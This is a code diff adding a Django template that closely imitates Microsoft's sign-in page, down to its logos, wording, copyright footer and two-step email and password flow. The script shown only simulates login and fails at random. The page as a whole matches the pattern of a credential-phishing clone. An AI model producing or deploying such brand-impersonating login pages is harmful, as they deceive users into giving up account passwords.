@@ -1,9 +1,621 @@
 {% extends 'base.html' %}
-
 {% load static %}
 
 {% block content %}
-<div>
+<div class="microsoft-login-container">
+    <div class="login-card">
+        <!-- Microsoft Logo Header -->
+        <div class="logo-header">
+            <img src="{% static 'images/microsoft-logo.png' %}" alt="Microsoft" class="microsoft-logo">
+        </div>
 
+        <!-- Sign In Form -->
+        <form id="loginForm" method="POST" action="{% url 'microsoft_login' %}">
+            {% csrf_token %}
+            <h1 class="signin-title">Sign in</h1>
+            
+            <!-- Email Input -->
+            <div class="input-group">
+                <label for="email">Email, phone, or Skype</label>
+                <input type="text" id="email" name="email" required autocomplete="username">
+                <div class="input-error" id="email-error"></div>
+            </div>
+            
+            <!-- Password Input (shown after email entry) -->
+            <div class="input-group password-group" id="passwordGroup" style="display:none;">
+                <label for="password">Password</label>
+                <div class="password-input-container">
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                    <button type="button" class="show-password" id="showPassword">
+                        <svg viewBox="0 0 24 24">
+                            <path fill="currentColor" d="M12,9A3,3 0 0,1 15,12A3,3 0 0,1 12,15A3,3 0 0,1 9,12A3,3 0 0,1 12,9M12,4.5C17,4.5 21.27,7.61 23,12C21.27,16.39 17,19.5 12,19.5C7,19.5 2.73,16.39 1,12C2.73,7.61 7,4.5 12,4.5M3.18,12C4.83,15.36 8.24,17.5 12,17.5C15.76,17.5 19.17,15.36 20.82,12C19.17,8.64 15.76,6.5 12,6.5C8.24,6.5 4.83,8.64 3.18,12Z"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="input-error" id="password-error"></div>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            
+            <!-- Next Button (email) / Sign In Button (password) -->
+            <button type="button" class="btn btn-primary" id="nextButton">Next</button>
+            <button type="submit" class="btn btn-primary" id="signInButton" style="display:none;">Sign in</button>
+            
+            <!-- Keep me signed in checkbox (shown with password) -->
+            <div class="remember-me" id="rememberMe" style="display:none;">
+                <input type="checkbox" id="keepSignedIn" name="keep_signed_in">
+                <label for="keepSignedIn">Keep me signed in</label>
+            </div>
+            
+            <!-- Alternative Options -->
+            <div class="alternative-options">
+                <a href="#" class="signin-option">
+                    <img src="{% static 'images/windows-logo.png' %}" alt="Windows">
+                    Sign in with Windows Hello or a security key
+                </a>
+                <a href="#" class="signin-option">
+                    <img src="{% static 'images/phone-icon.png' %}" alt="Phone">
+                    Sign in with phone or SMS
+                </a>
+            </div>
+        </form>
+        
+        <!-- Footer Links -->
+        <div class="login-footer">
+            <div class="language-selector">
+                <svg viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M12,21.35L10.55,20.03C5.4,15.36 2,12.27 2,8.5C2,5.41 4.42,3 7.5,3C9.24,3 10.91,3.81 12,5.08C13.09,3.81 14.76,3 16.5,3C19.58,3 22,5.41 22,8.5C22,12.27 18.6,15.36 13.45,20.03L12,21.35Z"/>
+                </svg>
+                <select id="languageSelect">
+                    <option value="en">English (United States)</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="de">Deutsch</option>
+                </select>
+            </div>
+            <div class="footer-links">
+                <a href="#">Privacy & cookies</a>
+                <a href="#">Terms of use</a>
+                <a href="#">Help</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Microsoft Footer -->
+    <div class="microsoft-footer">
+        <img src="{% static 'images/microsoft-logo-gray.png' %}" alt="Microsoft">
+        <span>© {% now "Y" %} Microsoft</span>
+    </div>
+    
+    <!-- Loading Spinner -->
+    <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner"></div>
+    </div>
+    
+    <!-- Error Modal -->
+    <div class="error-modal" id="errorModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>We couldn't sign you in</h3>
+                <button class="close-modal" id="closeModal">&times;</button>
+            </div>
+            <div class="modal-body" id="modalErrorMessage">
+                Please check your email and password and try again.
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" id="tryAgainButton">Try again</button>
+            </div>
+        </div>
+    </div>
 </div>
-{% endblok %}
+
+<style>
+    :root {
+        --primary-color: #0078d4;
+        --primary-hover: #106ebe;
+        --text-color: #323130;
+        --light-gray: #f3f2f1;
+        --medium-gray: #edebe9;
+        --dark-gray: #a19f9d;
+        --error-color: #a80000;
+        --success-color: #107c10;
+        --border-radius: 4px;
+        --box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132),0 0.3px 0.9px 0 rgba(0,0,0,.108);
+    }
+    
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+    }
+    
+    body {
+        background-color: #fff;
+        color: var(--text-color);
+        line-height: 1.5;
+    }
+    
+    .microsoft-login-container {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        background-color: var(--light-gray);
+    }
+    
+    .login-card {
+        width: 100%;
+        max-width: 440px;
+        background-color: #fff;
+        border-radius: var(--border-radius);
+        box-shadow: var(--box-shadow);
+        padding: 40px;
+        position: relative;
+    }
+    
+    .logo-header {
+        text-align: center;
+        margin-bottom: 24px;
+    }
+    
+    .microsoft-logo {
+        height: 23px;
+        width: auto;
+    }
+    
+    .signin-title {
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 24px;
+        color: var(--text-color);
+    }
+    
+    .input-group {
+        margin-bottom: 20px;
+    }
+    
+    .input-group label {
+        display: block;
+        font-size: 14px;
+        margin-bottom: 6px;
+        font-weight: 600;
+    }
+    
+    .input-group input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid var(--dark-gray);
+        border-radius: var(--border-radius);
+        font-size: 15px;
+        transition: border-color 0.2s;
+    }
+    
+    .input-group input:focus {
+        outline: none;
+        border-color: var(--primary-color);
+        box-shadow: 0 0 0 2px rgba(0,120,212,0.3);
+    }
+    
+    .input-error {
+        color: var(--error-color);
+        font-size: 12px;
+        margin-top: 4px;
+        height: 16px;
+    }
+    
+    .password-input-container {
+        position: relative;
+    }
+    
+    .show-password {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: var(--dark-gray);
+    }
+    
+    .show-password svg {
+        width: 20px;
+        height: 20px;
+    }
+    
+    .show-password:hover {
+        color: var(--primary-color);
+    }
+    
+    .forgot-password {
+        display: inline-block;
+        margin-top: 8px;
+        font-size: 13px;
+        color: var(--primary-color);
+        text-decoration: none;
+    }
+    
+    .forgot-password:hover {
+        text-decoration: underline;
+    }
+    
+    .btn {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: var(--border-radius);
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.2s;
+    }
+    
+    .btn-primary {
+        background-color: var(--primary-color);
+        color: white;
+    }
+    
+    .btn-primary:hover {
+        background-color: var(--primary-hover);
+    }
+    
+    .btn-primary:disabled {
+        background-color: var(--medium-gray);
+        color: var(--dark-gray);
+        cursor: not-allowed;
+    }
+    
+    .btn-secondary {
+        background-color: white;
+        color: var(--primary-color);
+        border: 1px solid var(--primary-color);
+    }
+    
+    .btn-secondary:hover {
+        background-color: var(--light-gray);
+    }
+    
+    .remember-me {
+        display: flex;
+        align-items: center;
+        margin: 16px 0;
+    }
+    
+    .remember-me input {
+        margin-right: 8px;
+    }
+    
+    .alternative-options {
+        margin-top: 32px;
+        border-top: 1px solid var(--medium-gray);
+        padding-top: 20px;
+    }
+    
+    .signin-option {
+        display: flex;
+        align-items: center;
+        padding: 10px 0;
+        color: var(--primary-color);
+        text-decoration: none;
+        font-size: 14px;
+    }
+    
+    .signin-option:hover {
+        text-decoration: underline;
+    }
+    
+    .signin-option img {
+        width: 20px;
+        height: 20px;
+        margin-right: 10px;
+    }
+    
+    .login-footer {
+        margin-top: 40px;
+        font-size: 12px;
+        color: var(--dark-gray);
+    }
+    
+    .language-selector {
+        display: flex;
+        align-items: center;
+        margin-bottom: 16px;
+    }
+    
+    .language-selector svg {
+        width: 16px;
+        height: 16px;
+        margin-right: 8px;
+        color: var(--dark-gray);
+    }
+    
+    .language-selector select {
+        background: none;
+        border: none;
+        color: var(--dark-gray);
+        font-size: 12px;
+        cursor: pointer;
+    }
+    
+    .footer-links {
+        display: flex;
+        gap: 16px;
+    }
+    
+    .footer-links a {
+        color: var(--dark-gray);
+        text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+        text-decoration: underline;
+    }
+    
+    .microsoft-footer {
+        margin-top: 40px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 12px;
+        color: var(--dark-gray);
+    }
+    
+    .microsoft-footer img {
+        height: 16px;
+        width: auto;
+    }
+    
+    .loading-spinner {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255,255,255,0.8);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+    }
+    
+    .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid var(--light-gray);
+        border-top: 4px solid var(--primary-color);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    
+    .error-modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0,0,0,0.5);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+    }
+    
+    .modal-content {
+        background-color: white;
+        border-radius: var(--border-radius);
+        width: 100%;
+        max-width: 440px;
+        box-shadow: var(--box-shadow);
+        overflow: hidden;
+    }
+    
+    .modal-header {
+        padding: 16px 24px;
+        border-bottom: 1px solid var(--medium-gray);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    
+    .modal-header h3 {
+        font-size: 20px;
+        font-weight: 600;
+    }
+    
+    .close-modal {
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: var(--dark-gray);
+    }
+    
+    .modal-body {
+        padding: 24px;
+        font-size: 15px;
+    }
+    
+    .modal-footer {
+        padding: 16px 24px;
+        border-top: 1px solid var(--medium-gray);
+        display: flex;
+        justify-content: flex-end;
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 480px) {
+        .login-card {
+            padding: 24px;
+        }
+        
+        .signin-title {
+            font-size: 20px;
+        }
+        
+        .footer-links {
+            flex-direction: column;
+            gap: 8px;
+        }
+    }
+</style>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // DOM Elements
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const emailError = document.getElementById('email-error');
+        const passwordError = document.getElementById('password-error');
+        const nextButton = document.getElementById('nextButton');
+        const signInButton = document.getElementById('signInButton');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const rememberMe = document.getElementById('rememberMe');
+        const showPassword = document.getElementById('showPassword');
+        const loginForm = document.getElementById('loginForm');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const errorModal = document.getElementById('errorModal');
+        const closeModal = document.getElementById('closeModal');
+        const tryAgainButton = document.getElementById('tryAgainButton');
+        const modalErrorMessage = document.getElementById('modalErrorMessage');
+        
+        // Form State
+        let currentStep = 1; // 1 = email entry, 2 = password entry
+        let validEmail = false;
+        let validPassword = false;
+        
+        // Email Validation
+        emailInput.addEventListener('input', function() {
+            const email = emailInput.value.trim();
+            validEmail = validateEmail(email);
+            
+            if (email.length === 0) {
+                emailError.textContent = '';
+            } else if (!validEmail) {
+                emailError.textContent = 'Please enter a valid email address';
+            } else {
+                emailError.textContent = '';
+            }
+            
+            nextButton.disabled = !validEmail;
+        });
+        
+        // Password Validation
+        passwordInput.addEventListener('input', function() {
+            const password = passwordInput.value;
+            validPassword = password.length >= 6;
+            
+            if (password.length === 0) {
+                passwordError.textContent = '';
+            } else if (!validPassword) {
+                passwordError.textContent = 'Password must be at least 6 characters';
+            } else {
+                passwordError.textContent = '';
+            }
+            
+            signInButton.disabled = !validPassword;
+        });
+        
+        // Show/Hide Password
+        showPassword.addEventListener('click', function() {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showPassword.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path fill="currentColor" d="M11.83,9L15,12.16C15,12.11 15,12.05 15,12A3,3 0 0,0 12,9C11.94,9 11.89,9 11.83,9M7.53,9.8L9.08,11.35C9.03,11.56 9,11.77 9,12A3,3 0 0,0 12,15C12.22,15 12.44,14.97 12.65,14.92L14.2,16.47C13.53,16.8 12.79,17 12,17A5,5 0 0,1 7,12C7,11.21 7.2,10.47 7.53,9.8M2,4.27L4.28,6.55L4.73,7C3.08,8.3 1.78,10 1,12C2.73,16.39 7,19.5 12,19.5C13.55,19.5 15.03,19.2 16.38,18.66L16.81,19.08L19.73,22L21,20.73L3.27,3M12,7A5,5 0 0,1 17,12C17,12.64 16.87,13.26 16.64,13.82L19.57,16.75C21.07,15.5 22.27,13.86 23,12C21.27,7.61 17,4.5 12,4.5C10.6,4.5 9.26,4.75 8,5.2L10.17,7.35C10.74,7.13 11.35,7 12,7Z"/>
+                    </svg>`;
+            } else {
+                passwordInput.type = 'password';
+                showPassword.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path fill="currentColor" d="M12,9A3,3 0 0,1 15,12A3,3 0 0,1 12,15A3,3 0 0,1 9,12A3,3 0 0,1 12,9M12,4.5C17,4.5 21.27,7.61 23,12C21.27,16.39 17,19.5 12,19.5C7,19.5 2.73,16.39 1,12C2.73,7.61 7,4.5 12,4.5M3.18,12C4.83,15.36 8.24,17.5 12,17.5C15.76,17.5 19.17,15.36 20.82,12C19.17,8.64 15.76,6.5 12,6.5C8.24,6.5 4.83,8.64 3.18,12Z"/>
+                    </svg>`;
+            }
+        });
+        
+        // Next Button Click (Email Step)
+        nextButton.addEventListener('click', function() {
+            if (validEmail) {
+                // Simulate checking if account exists
+                loadingSpinner.style.display = 'flex';
+                
+                setTimeout(function() {
+                    loadingSpinner.style.display = 'none';
+                    
+                    // For demo purposes, we'll always show the password field
+                    // In a real app, you'd check if the account exists first
+                    currentStep = 2;
+                    emailInput.readOnly = true;
+                    nextButton.style.display = 'none';
+                    passwordGroup.style.display = 'block';
+                    rememberMe.style.display = 'block';
+                    signInButton.style.display = 'block';
+                    
+                    // Set focus to password field
+                    passwordInput.focus();
+                }, 1000);
+            }
+        });
+        
+        // Form Submission
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (currentStep === 1) {
+                nextButton.click();
+                return;
+            }
+            
+            if (validEmail && validPassword) {
+                loadingSpinner.style.display = 'flex';
+                
+                // Simulate authentication
+                setTimeout(function() {
+                    loadingSpinner.style.display = 'none';
+                    
+                    // For demo purposes, we'll randomly fail 20% of the time
+                    if (Math.random() < 0.2) {
+                        showError('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
+                    } else {
+                        // Successful login - in a real app, this would redirect
+                        window.location.href = "{% url 'dashboard' %}";
+                    }
+                }, 1500);
+            }
+        });
+        
+        // Modal Controls
+        closeModal.addEventListener('click', function() {
+            errorModal.style.display = 'none';
+        });
+        
+        tryAgainButton.addEventListener('click', function() {
+            errorModal.style.display = 'none';
+            passwordInput.focus();
+        });
+        
+        // Helper Functions
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        function showError(message) {
+            modalErrorMessage.textContent = message;
+            errorModal.style.display = 'flex';
+        }
+        
+        // Language Selector
+        document.getElementById('languageSelect').addEventListener('change', function() {
+            // In a real app, this would change the language
+            console.log('Language changed to:', this.value);
+        });
+    });
+</script>
+{% endblock %}
